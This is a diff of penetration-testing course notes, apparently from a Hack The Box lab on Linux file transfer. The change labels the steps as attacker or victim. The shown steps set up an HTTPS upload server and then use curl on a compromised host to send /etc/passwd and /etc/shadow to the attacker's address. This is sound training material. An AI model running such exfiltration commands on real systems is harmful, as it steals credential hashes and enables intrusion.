@@ -130,21 +130,21 @@ There are also situations such as binary exploitation and packet capture analysi
 
 As mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.
 
-#### Pwnbox - install Web Server
+#### Pwnbox - install Web Server (Attacker)
 ```shell
 sudo python3 -m pip install --user uploadserver
 ```
 
 Now we need to create a certificate. In this example, we are using a self-signed certificate.
 
-#### Pwnbox - Create a Self-Signed Certificate
+#### Pwnbox - Create a Self-Signed Certificate (Attacker)
 ```shell
 openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
 ```
 ![](../../Attachements/Pasted%20image%2020260727120016.png)
 The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
 
-#### Pwnbox - Start Web Server
+#### Pwnbox - Start Web Server (Attacker)
 ```shell
 mkdir https && cd https
 sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
@@ -152,7 +152,7 @@ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 ![](../../Attachements/Pasted%20image%2020260727120117.png)
 Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.
 
-#### Linux - Upload Multiple Files
+#### Linux - Upload Multiple Files (Victim)
 ```shell
 Captainsparrow@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
